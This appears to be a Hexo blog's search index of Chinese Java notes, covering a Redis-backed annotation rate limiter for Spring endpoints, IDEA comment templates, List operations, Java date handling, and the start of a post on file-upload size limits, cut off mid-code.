<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>自定义注解实现接口防刷</title>
      <link href="/2023/04/14/zi-ding-yi-zhu-jie-shi-xian-jie-kou-fang-shua/"/>
      <url>/2023/04/14/zi-ding-yi-zhu-jie-shi-xian-jie-kou-fang-shua/</url>
      
        <content type="html"><![CDATA[<p>服务器通过redis记录下你的请求次数,如果次数超出限制,则不给访问,在redis保存key是有时效性的,过期就会删除。</p><h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><p>这次我们使用 注解 拦截器 缓存 来实现这个功能</p><h2 id="创建一个自定义注解"><a href="#创建一个自定义注解" class="headerlink" title="创建一个自定义注解"></a>创建一个自定义注解</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>annotation<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * 自定义注解 */</span><span class="token annotation punctuation">@Documented</span><span class="token annotation punctuation">@Inherited</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span>ElementType<span class="token punctuation">.</span>METHOD<span class="token punctuation">)</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span>RetentionPolicy<span class="token punctuation">.</span>RUNTIME<span class="token punctuation">)</span><span class="token keyword">public</span> @<span class="token keyword">interface</span> <span class="token class-name">AccessLimit</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 在  seconds 秒内 , 最大只能请求 maxCount 次     *     * @return     */</span>    <span class="token comment" spellcheck="true">//    秒</span>    <span class="token keyword">int</span> <span class="token function">seconds</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//    最大数量</span>    <span class="token keyword">int</span> <span class="token function">maxCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="创建一个拦截器"><a href="#创建一个拦截器" class="headerlink" title="创建一个拦截器"></a>创建一个拦截器</h2><p>用于拦截请求,更新当前用户访问的次数,如果访问受限,则返回超时的状态码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>AccessLimit<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Autowired<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>core<span class="token punctuation">.</span>RedisTemplate<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span>Component<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>method<span class="token punctuation">.</span>HandlerMethod<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>handler<span class="token punctuation">.</span>HandlerInterceptorAdapter<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Resource<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletRequest<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>OutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>TimeUnit<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * 拦截器 * */</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FangshuaInterceptor</span> <span class="token keyword">extends</span> <span class="token class-name">HandlerInterceptorAdapter</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Resource</span>    RedisTemplate<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> redisTemplate<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">preHandle</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">,</span> Object handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//       1. 判断请求是否属于方法的请求</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>handler <span class="token keyword">instanceof</span> <span class="token class-name">HandlerMethod</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//       2. 取出当前方法的对象</span>            HandlerMethod handler1 <span class="token operator">=</span> <span class="token punctuation">(</span>HandlerMethod<span class="token punctuation">)</span> handler<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//       3. 获取方法中的注解,看是否有该注解</span>            AccessLimit accessLimit <span class="token operator">=</span> handler1<span class="token punctuation">.</span><span class="token function">getMethodAnnotation</span><span class="token punctuation">(</span>AccessLimit<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//            3.1 : 不包含此注解,则不进行操作</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>accessLimit <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//                3.2 ： 判断请求是否受限制</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isLimit</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> accessLimit<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">render</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> <span class="token string">"{\"code\":\"30001\",\"message\":\"请求过快\"}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//判断请求是否受限</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isLimit</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> AccessLimit accessLimit<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 受限的redis 缓存key ,因为这里用浏览器做测试，我就用sessionid 来做唯一key,如果是app ,可以使用 用户ID 之类的唯一标识。</span>        String limitKey <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getServletPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 从缓存中获取，当前这个请求访问了几次</span>        Integer redisCount <span class="token operator">=</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> redisTemplate<span class="token punctuation">.</span><span class="token function">opsForValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>limitKey<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>redisCount <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//初始 次数</span>            redisTemplate<span class="token punctuation">.</span><span class="token function">opsForValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>limitKey<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> accessLimit<span class="token punctuation">.</span><span class="token function">seconds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"写入redis --"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"intValue-->"</span> <span class="token operator">+</span> redisCount<span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>redisCount<span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> accessLimit<span class="token punctuation">.</span><span class="token function">maxCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 次数自增</span>            redisTemplate<span class="token punctuation">.</span><span class="token function">opsForValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">increment</span><span class="token punctuation">(</span>limitKey<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">render</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> String cm<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"application/json;charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        OutputStream out <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>cm<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="注册拦截器"><a href="#注册拦截器" class="headerlink" title="注册拦截器"></a>注册拦截器</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Autowired<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Bean<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Configuration<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>lettuce<span class="token punctuation">.</span>LettuceConnectionFactory<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>core<span class="token punctuation">.</span>RedisTemplate<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span>GenericJackson2JsonRedisSerializer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span>StringRedisSerializer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>InterceptorRegistry<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>WebMvcConfigurerAdapter<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WebConfig</span> <span class="token keyword">extends</span> <span class="token class-name">WebMvcConfigurerAdapter</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> FangshuaInterceptor interceptor<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addInterceptors</span><span class="token punctuation">(</span>InterceptorRegistry registry<span class="token punctuation">)</span> <span class="token punctuation">{</span>        registry<span class="token punctuation">.</span><span class="token function">addInterceptor</span><span class="token punctuation">(</span>interceptor<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 解决 redis 的编码统一方面的问题 (了解)     *     * @param connectionFactory     * @return     */</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> RedisTemplate<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Serializable<span class="token operator">></span> <span class="token function">redisTemplate</span><span class="token punctuation">(</span>LettuceConnectionFactory connectionFactory<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//创建 redisTemplate 模版</span>        RedisTemplate<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Serializable<span class="token operator">></span> redisTemplate <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RedisTemplate</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//设置 value 的转化格式和 key 的转化格式</span>        redisTemplate<span class="token punctuation">.</span><span class="token function">setKeySerializer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRedisSerializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        redisTemplate<span class="token punctuation">.</span><span class="token function">setValueSerializer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">GenericJackson2JsonRedisSerializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//关联 redisConnectionFactory</span>        redisTemplate<span class="token punctuation">.</span><span class="token function">setConnectionFactory</span><span class="token punctuation">(</span>connectionFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> redisTemplate<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/test"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/test1"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//    指定此接口同一个用户在20秒内只能访问2次</span>    <span class="token annotation punctuation">@AccessLimit</span><span class="token punctuation">(</span>seconds <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">,</span> maxCount <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"我是test1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="/images/%E6%8E%A5%E5%8F%A3%E9%98%B2%E5%88%B7.png" alt="拦截结果"></p>]]></content>
      
      
      <categories>
          
          <category> 自定义注解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA快捷注释</title>
      <link href="/2023/03/02/idea-kuai-jie-zhu-shi/"/>
      <url>/2023/03/02/idea-kuai-jie-zhu-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="IDEA快捷注释"><a href="#IDEA快捷注释" class="headerlink" title="IDEA快捷注释"></a>IDEA快捷注释</h1><blockquote><p><a href="https://blog.csdn.net/qq_41393190/article/details/127240510?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-9-127240510-blog-105628730.235%5Ev40%5Epc_relevant_anti_t3_base&amp;spm=1001.2101.3001.4242.6&amp;utm_relevant_index=12">https://blog.csdn.net/qq_41393190/article/details/127240510?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-9-127240510-blog-105628730.235^v40^pc_relevant_anti_t3_base&amp;spm=1001.2101.3001.4242.6&amp;utm_relevant_index=12</a></p></blockquote><pre class=" language-java"><code class="language-java"><span class="token operator">*</span><span class="token operator">*</span>  <span class="token operator">*</span>  <span class="token operator">*</span> $var1$ $params$ <span class="token operator">*</span> @<span class="token keyword">return</span><span class="token operator">:</span> $returns$  <span class="token operator">*</span> <span class="token annotation punctuation">@Author</span><span class="token operator">:</span> CZM <span class="token operator">*</span><span class="token operator">/</span></code></pre><p><img src="/images/IDEA%E6%B3%A8%E9%87%8A.png" alt="IDEA注释"></p>]]></content>
      
      
      <categories>
          
          <category> 注释 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>List操作</title>
      <link href="/2023/02/24/list-xiang-guan-cao-zuo/"/>
      <url>/2023/02/24/list-xiang-guan-cao-zuo/</url>
      
        <content type="html"><![CDATA[<h1 id="List相关操作"><a href="#List相关操作" class="headerlink" title="List相关操作"></a>List相关操作</h1><h2 id="List去重"><a href="#List去重" class="headerlink" title="List去重"></a>List去重</h2><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 利用list中的元素创建HashSet集合，此时set中进行了去重操作</span>HashSet set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 清空list集合</span>list<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 将去重后的元素重新添加到list中</span>list<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><hr><h2 id="判断某个值是否存在List中"><a href="#判断某个值是否存在List中" class="headerlink" title="判断某个值是否存在List中"></a>判断某个值是否存在List中</h2><p><strong>List的contains(obj)方法</strong></p><p>实际上，List调用contains(Object obj)方法时，会遍历List中的每一个元素，然后再调用每个元素的equals()方法去跟contains()方法中的参数进行比较，如果有一个元素的equals()方法返回true则contains()方法返回true，否则所有equals()方法都不返回true，则ontains()方法则返回false。因此，重写了Course类的equals()方法，否则，testListContains()方法的第二条输出为false。<br>　　<br><strong>Set的Contains(obj)方法</strong></p><p>当调用HashSet的contains(Object obj)方法时，其实是先调用每个元素的hashCode()方法来返回哈希码，如果哈希码的值相等的情况下再调用equals(obj)方法去判断是否相等，只有在这两个方法所返回的值都相等的情况下，才判定这个HashSet包含某个元素。因此，需重写Course类的hashCode()方法和equals()方法。<br>　　<br> <strong>Map中是否包含指定的Key和Value</strong></p><p>在Map中，用containsKey()方法，判断是否包含某个Key值；用containsValue()方法，判断是否包含某个Value值。</p><p><strong>注</strong>：跟List中的Contains()方法一样，Map中的ContainsValue()方法也需要调用某个Value值的equals()方法，去和参数对象进行比较，如果匹配成功，返回结果为true，说明在Map中的Value值确实包含参数对象。因此，需要重写Student类的equals()方法。</p><p><strong>注意</strong>：<code>Arrays.asList</code>返回的是一个固定大小的列表，不支持添加或删除元素的操作</p><h2 id="List分割"><a href="#List分割" class="headerlink" title="List分割"></a>List分割</h2><p>用于大数据量分批处理。</p><p><code>Lists.partition</code>是Google Guava库中的一个方法，用于将一个列表按指定大小进行分割成多个子列表。</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.google.guava<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>guava<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>30.1-jre<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><p>方法签名如下：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>T<span class="token operator">>></span> <span class="token function">partition</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>T<span class="token operator">></span> list<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span></code></pre><p>参数说明：</p><ul><li><code>list</code>：要分割的列表。</li><li><code>size</code>：每个子列表的大小。</li></ul><p>返回值是一个包含多个子列表的列表，每个子列表的大小为<code>size</code>，除了最后一个子列表可能小于<code>size</code>。</p><p>使用<code>Lists.partition</code>方法可以方便地将一个大列表分割成多个小列表，便于进行批量处理或分批操作。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java日期时间</title>
      <link href="/2023/01/20/java-ri-qi-shi-jian/"/>
      <url>/2023/01/20/java-ri-qi-shi-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="Java日期时间"><a href="#Java日期时间" class="headerlink" title="Java日期时间"></a>Java日期时间</h1><h2 id="搜DateUtil工具类"><a href="#搜DateUtil工具类" class="headerlink" title="搜DateUtil工具类"></a>搜DateUtil工具类</h2><h2 id="搜DateFormatUtils工具类"><a href="#搜DateFormatUtils工具类" class="headerlink" title="搜DateFormatUtils工具类"></a>搜DateFormatUtils工具类</h2><h2 id="常用date对象方法"><a href="#常用date对象方法" class="headerlink" title="常用date对象方法"></a>常用date对象方法</h2><ul><li>boolean after(Date date) 若当调用此方法的Date对象在指定日期之后返回true,否则返回false。</li><li>boolean before(Date date) 若当调用此方法的Date对象在指定日期之前返回true,否则返回false。</li><li>int compareTo(Date date) 比较当调用此方法的Date对象和指定日期。两者相等时候返回0。调用对象在指定日期之前则返回负数。调用对象在指定日期之后则返回正数。</li><li>long getTime( ) 返回自 1970 年 1 月 1 日 00:00:00 GMT 以来此 Date 对象表示的毫秒数。</li></ul><h2 id="日期格式化"><a href="#日期格式化" class="headerlink" title="日期格式化"></a>日期格式化</h2><pre><code>Date dNow = new Date( ); SimpleDateFormat ft = new SimpleDateFormat (&quot;yyyy-MM-dd hh:mm:ss&quot;); System.out.println(&quot;当前时间为: &quot; + ft.format(dNow));</code></pre><h2 id="Date与String的相互转换"><a href="#Date与String的相互转换" class="headerlink" title="Date与String的相互转换"></a>Date与String的相互转换</h2><p>String转换成Date类型</p><pre><code>SimpleDateFormat format= new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);Date date = format.parse(&quot;2019-09-19&quot;)</code></pre><p>Date转换成String类型</p><pre><code>SimpleDateFormat format= new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);String time = format.format(new Date());</code></pre><h2 id="Calendar类"><a href="#Calendar类" class="headerlink" title="Calendar类"></a>Calendar类</h2><pre><code>//创建一个代表2009年6月12日的Calendar对象Calendar c1 =Calendar.getInstance();c1.set(2009, 6 - 1, 12);//日期加10天c1.add(Calendar.DATE, 10);//获取月份int month=c1.get(Calendar.MONTH);</code></pre><h2 id="Calendar类对象字段类型"><a href="#Calendar类对象字段类型" class="headerlink" title="Calendar类对象字段类型"></a>Calendar类对象字段类型</h2><h2 id="Calendar与Date的相互转换"><a href="#Calendar与Date的相互转换" class="headerlink" title="Calendar与Date的相互转换"></a>Calendar与Date的相互转换</h2><p> Calendar转化为Date </p><pre><code>Calendar cal=Calendar.getInstance();  Date date=cal.getTime();  </code></pre><p>Date转化为Calendar  </p><pre><code>Date date=new Date();  Calendar cal=Calendar.getInstance();  cal.setTime(date);  </code></pre><h2 id="打印间隔日期"><a href="#打印间隔日期" class="headerlink" title="打印间隔日期"></a>打印间隔日期</h2><pre><code>        //每隔3天打印日期        String dateStart = &quot;2021-02-07&quot;;        String dateEnd = &quot;2021-03-19&quot;;        SimpleDateFormat date = new SimpleDateFormat(&quot;yyyy-MM-dd&quot;);        long startTime = date.parse(dateStart).getTime();        long endTime = date.parse(dateEnd).getTime();        long day = 1000 * 60 * 60 * 24*3;        for (long i = startTime; i &lt;= endTime; i += day) &#123;            System.out.println(date.format(new Date(i)));        &#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传大小异常捕获</title>
      <link href="/2023/01/14/wen-jian-shang-chuan-da-xiao-yi-chang-bu-huo/"/>
      <url>/2023/01/14/wen-jian-shang-chuan-da-xiao-yi-chang-bu-huo/</url>
      
        <content type="html"><![CDATA[<h1 id="业务场景"><a href="#业务场景" class="headerlink" title="业务场景"></a>业务场景</h1><p>上传文件是web项目中常见且较为复杂的业务</p><p>限制文件的类型与大小是其中重要的校验环节</p><p>本文就着重讲解下如何限制文件大小和在实现中可能会遇到的坑</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="增加配置"><a href="#增加配置" class="headerlink" title="增加配置"></a>增加配置</h2><p>在配置文件中增加如下配置:</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>    <span class="token key atrule">servlet</span><span class="token punctuation">:</span>        <span class="token key atrule">multipart</span><span class="token punctuation">:</span>            max<span class="token punctuation">-</span>file<span class="token punctuation">-</span>size=1024MB            max<span class="token punctuation">-</span>request<span class="token punctuation">-</span>size=1024MB</code></pre><h2 id="全局异常捕获"><a href="#全局异常捕获" class="headerlink" title="全局异常捕获"></a>全局异常捕获</h2><p>文件大小限制已经实现, 但大多数情况我们都需要自行处理异常的返回信息</p><p>使用全局异常拦截即可:</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@RestControllerAdvice</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GlobalExceptionHandler</span> <span class="token punctuation">{</span>  <span class="token annotation punctuation">@Autowired</span>  <span class="token keyword">private</span> MultipartProperties multipartProperties<span class="token punctuation">;</span>  <span class="token annotation punctuation">@ExceptionHandler</span><span class="token punctuation">(</span>value <span class="token operator">=</span> MultipartException<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>  <span class="token keyword">public</span> <span 